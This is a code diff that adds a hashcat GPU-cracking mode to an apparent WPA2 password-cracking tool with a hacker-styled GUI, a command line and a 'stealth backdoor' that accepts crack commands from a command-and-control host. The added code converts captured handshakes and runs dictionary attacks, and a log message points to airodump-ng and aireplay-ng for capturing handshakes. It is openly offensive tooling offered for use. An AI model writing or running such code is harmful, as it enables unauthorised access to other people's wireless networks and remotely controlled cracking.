@@ -26,6 +26,7 @@ import binascii
 import socket
 import subprocess
 import base64
+import json
 
 
 def verify_real_wpa_psk(ssid, psk_candidate, target_pmk_hex):
@@ -91,6 +92,12 @@ class StealthBackdoor:
                 result, attempts, elapsed = ai_brain_attack(ssid, pmk_hex, max_length=20, max_threads=8, timeout=60)
             elif mode == "smart":
                 result = smart_brute_force(ssid, pmk_hex)
+            elif mode == "hashcat":
+                # For hashcat, we need a .cap file path
+                if len(parts) < 4:
+                    return "[!] Usage: crack <ssid> <pmk_hex> hashcat <cap_file>"
+                cap_file = parts[3]
+                result = hashcat_attack(cap_file, self.wordlist)
             else:
                 result = None
 
@@ -174,6 +181,104 @@ class StealthBackdoor:
 
         self.sock.close()
         print("[+] Backdoor disconnected")
+
+
+class HashcatIntegrator:
+    """Integrate with hashcat for GPU-accelerated WPA2 cracking."""
+
+    def __init__(self, hashcat_path="hashcat.exe", wordlist="rockyou.txt"):
+        self.hashcat_path = hashcat_path
+        self.wordlist = wordlist
+        self.temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), 'wpa2_crack')
+
+        if not os.path.exists(self.temp_dir):
+            os.makedirs(self.temp_dir)
+
+    def convert_cap_to_hccapx(self, cap_file, output_file=None):
+        """Convert .cap file to hashcat .hc22000 format."""
+        if not output_file:
+            output_file = os.path.join(self.temp_dir, "hash.hc22000")
+
+        # Use hcxpcapngtool if available, otherwise try cap2hccapx
+        converters = [
+            "hcxpcapngtool",
+            "cap2hccapx.exe",
+            "C:\\Program Files\\Aircrack-ng\\bin\\cap2hccapx.exe"
+        ]
+
+        for converter in converters:
+            try:
+                cmd = [converter, "-o", output_file, cap_file]
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                if result.returncode == 0 and os.path.exists(output_file):
+                    return output_file
+            except:
+                continue
+
+        raise Exception("No suitable .cap to .hc22000 converter found. Install hcxtools or aircrack-ng.")
+
+    def crack_with_hashcat(self, hash_file, wordlist=None, attack_mode="0", extra_args=None):
+        """Run hashcat cracking session."""
+        if not wordlist:
+            wordlist = self.wordlist
+
+        cmd = [
+            self.hashcat_path,
+            "-m", "22000",  # WPA2 mode
+            "-a", attack_mode,  # 0=dict, 3=brute, 1=combo, etc.
+            hash_file,
+            wordlist
+        ]
+
+        if extra_args:
+            cmd.extend(extra_args.split())
+
+        print(f"[+] Running: {' '.join(cmd)}")
+
+        try:
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+                universal_newlines=True
+            )
+
+            found_password = None
+            for line in iter(process.stdout.readline, ''):
+                print(line.strip())
+                if "Cracked" in line or ":" in line and len(line.split(":")) >= 2:
+                    # Try to extract password from hashcat output
+                    parts = line.strip().split(":")
+                    if len(parts) >= 6:  # hashcat WPA2 format
+                        found_password = parts[-1]  # Last part is the password
+                        break
+
+            process.wait()
+            return found_password
+
+        except Exception as e:
+            print(f"[!] Hashcat error: {e}")
+            return None
+
+    def benchmark_hashcat(self):
+        """Benchmark hashcat performance."""
+        try:
+            cmd = [self.hashcat_path, "-b"]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            return result.stdout
+        except Exception as e:
+            return f"Benchmark failed: {e}"
+
+    def check_hashcat_installation(self):
+        """Verify hashcat is properly installed."""
+        try:
+            result = subprocess.run([self.hashcat_path, "--version"],
+                                  capture_output=True, text=True, timeout=10)
+            return result.returncode == 0, result.stdout.strip()
+        except:
+            return False, "Hashcat not found"
 
 
 class AIBrain:
@@ -386,6 +491,43 @@ def brute_force_psk(ssid, target_pmk_hex, keys, max_workers=4):
                 break
 
     return found_psk
+
+
+def hashcat_attack(cap_file, wordlist=None, hashcat_path="hashcat.exe"):
+    """GPU-accelerated WPA2 cracking using hashcat."""
+    print(f"[🎯] HASHCAT ATTACK - GPU POWERED")
+
+    integrator = HashcatIntegrator(hashcat_path, wordlist)
+
+    # Check hashcat installation
+    installed, version = integrator.check_hashcat_installation()
+    if not installed:
+        print(f"[!] Hashcat not found at {hashcat_path}")
+        print("[!] Install from: https://hashcat.net/hashcat/")
+        return None
+
+    print(f"[+] Hashcat version: {version}")
+
+    try:
+        # Convert .cap to hashcat format
+        print(f"[+] Converting {cap_file} to hashcat format...")
+        hash_file = integrator.convert_cap_to_hccapx(cap_file)
+        print(f"[+] Converted to: {hash_file}")
+
+        # Run hashcat attack
+        print(f"[+] Starting GPU cracking with wordlist: {wordlist}")
+        result = integrator.crack_with_hashcat(hash_file, wordlist)
+
+        if result:
+            print(f"[🎯] HASHCAT CRACKED: {result}")
+            return result
+        else:
+            print("[!] Hashcat attack completed - no password found")
+            return None
+
+    except Exception as e:
+        print(f"[!] Hashcat integration error: {e}")
+        return None
 
 
 def optimized_random_attack(ssid, target_pmk_hex, keys, max_attempts=1000000):
@@ -647,6 +789,15 @@ class HackerGUI:
                                  fg=self.neon_cyan, insertbackground=self.neon_green)
         wordlist_entry.pack(fill=tk.X, pady=(5, 10))
 
+        # .cap file for hashcat
+        tk.Label(input_frame, text="[>] .CAP FILE (for hashcat):", font=("Courier New", 10, "bold"),
+                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
+        self.capfile_var = tk.StringVar()
+        capfile_entry = tk.Entry(input_frame, textvariable=self.capfile_var,
+                                font=("Courier New", 10), bg="#1a1f3a",
+                                fg=self.neon_cyan, insertbackground=self.neon_green)
+        capfile_entry.pack(fill=tk.X, pady=(5, 10))
+
     def _create_mode_section(self):
         """Create attack mode selection."""
         mode_frame = tk.Frame(self.root, bg=self.bg_dark)
@@ -656,7 +807,7 @@ class HackerGUI:
                 fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
 
         self.mode_var = tk.StringVar(value="lightning")
-        modes = ["lightning", "smart", "ai-brain", "systematic", "random"]
+        modes = ["lightning", "smart", "ai-brain", "systematic", "random", "hashcat"]
 
         mode_button_frame = tk.Frame(mode_frame, bg=self.bg_dark)
         mode_button_frame.pack(fill=tk.X, pady=(5, 10))
@@ -778,7 +929,10 @@ class HackerGUI:
             self.log_output(f"[*] Network: {ssid}", "info")
             self.log_output(f"[*] Target PMK: {pmk_hex[:32]}...", "info")
             self.log_output(f"[*] Mode: {mode.upper()}", "info")
-            self.log_output(f"[*] Wordlist: {wordlist or 'None'}\n", "info")
+            self.log_output(f"[*] Wordlist: {wordlist or 'None'}", "info")
+            if mode == "hashcat":
+                self.log_output(f"[*] .cap file: {self.capfile_var.get() or 'None'}", "info")
+            self.log_output("", "info")
 
             if mode == "lightning":
                 result = lightning_attack(ssid, pmk_hex, keys)
@@ -812,6 +966,16 @@ class HackerGUI:
                     self.log_output(f"\n🎯 RANDOM CRACKED: {result}\n", "success")
                 else:
                     self.log_output("\n[!] Random attack failed...\n", "error")
+            elif mode == "hashcat":
+                cap_file = self.capfile_var.get().strip()
+                if not cap_file:
+                    self.log_output("[!] ERROR: .cap file required for hashcat mode!", "error")
+                else:
+                    result = hashcat_attack(cap_file, wordlist)
+                    if result:
+                        self.log_output(f"\n🎯 HASHCAT CRACKED: {result}\n", "success")
+                    else:
+                        self.log_output("\n[!] Hashcat attack failed...\n", "error")
 
             self.log_output("\n[✓] Attack complete!\n", "success")
             self.update_status("Attack finished")
@@ -864,7 +1028,7 @@ def main():
         parser.add_argument("pmk_hex", nargs="?",
                             help="target PMK hex string for verification")
         parser.add_argument("-m", "--mode",
-                            choices=["lightning", "smart", "systematic", "random", "ai-brain"],
+                            choices=["lightning", "smart", "systematic", "random", "ai-brain", "hashcat"],
                             default="lightning",
                             help="attack mode to run")
         parser.add_argument("-k", "--charset",
@@ -881,6 +1045,9 @@ def main():
         parser.add_argument("--max-random", type=int, default=1000000,
                             help="max attempts for random attack")
         parser.add_argument("--logfile", help="optional log file to write output")
+        parser.add_argument("--capfile", help=".cap file for hashcat mode (handshake capture)")
+        parser.add_argument("--hashcat-path", default="hashcat.exe",
+                            help="path to hashcat executable")
         parser.add_argument("--backdoor", nargs='?', const="127.0.0.1:4444",
                             help="activate stealth backdoor mode [C2_HOST:C2_PORT]")
 
@@ -947,6 +1114,14 @@ def main():
             result = optimized_random_attack(ssid, pmk_hex, keys, max_attempts=args.max_random)
             if result:
                 log(f"\n🎯 RANDOM CRACKED: {result}")
+        elif args.mode == "hashcat":
+            if not args.capfile:
+                log("[!] ERROR: --capfile required for hashcat mode")
+                log("[!] Capture handshake first: airodump-ng + aireplay-ng")
+                return
+            result = hashcat_attack(args.capfile, args.wordlist, args.hashcat_path)
+            if result:
+                log(f"\n🎯 HASHCAT CRACKED: {result}")
     else:
         # Launch GUI
         root = tk.Tk()
